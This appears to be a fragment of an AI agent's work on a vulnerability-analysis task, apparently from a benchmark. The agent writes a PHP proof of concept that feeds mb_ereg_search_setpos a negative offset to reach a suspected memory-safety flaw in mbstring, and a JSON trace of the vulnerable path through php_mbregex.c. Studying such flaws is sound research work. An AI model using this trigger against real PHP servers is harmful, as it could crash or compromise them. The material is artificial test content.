message:
Running command: cd /workspace && cat > poc.php <<'EOF'
<?php
mb_regex_encoding('UTF-8');
mb_ereg_search_init("中国abc + abc ?!？！字符＃　china string", "(?<a>\\w+)");
mb_ereg_search();
mb_ereg_search_setpos(-1000);
mb_ereg_search_regs();
mb_ereg_search_getregs();
?>
EOF
cat > candidate_trace.json <<'EOF'
[
{"step":1,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1540,"var":"arg_str","code":"ZVAL_STR_COPY(&MBREX(search_str), arg_str);","note":"The attacker provides the subject string that becomes persistent mbregex state."},
{"step":2,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1551,"var":"MBREX(search_re)","code":"if (argc > 1) { MBREX(search_re) = php_mbregex_compile_pattern(arg_pattern, arg_pattern_len, option, MBREX(current_mbctype), syntax); }","note":"The attacker also provides a named-capture pattern that is stored as the current search regex."},
{"step":3,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_setpos)","line":1642,"var":"position","code":"if ((position < 0) && (!Z_ISUNDEF(MBREX(search_str))) && (Z_TYPE(MBREX(search_str)) == IS_STRING)) { position += Z_STRLEN(MBREX(search_str)); }","note":"A negative position is translated relative to the attacker-controlled string length, which keeps the cursor logic on the path through the initialized search state."},
{"step":4,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_setpos)","line":1648,"var":"MBREX(search_pos)","code":"MBREX(search_pos) = position;","note":"The shared search cursor is updated to the attacker-chosen offset and will steer the next search execution."},
{"step":5,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_regs)","line":1592,"var":"MBREX(search_regs)","code":"if (MBREX(search_regs) != NULL && Z_TYPE(MBREX(search_str)) == IS_STRING) { ... }","note":"The regs API consumes the shared cursor and match region after it has been moved, re-entering the stateful search machinery."},
{"step":6,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_getregs)","line":1603,"var":"MBREX(search_re)","code":"onig_foreach_name(MBREX(search_re), mb_regex_groups_iter, &args);","note":"Named-group enumeration walks the persistent regex object after the cursor transition, which is the memory-safety sink if the search bookkeeping is inconsistent."}
]
EOF

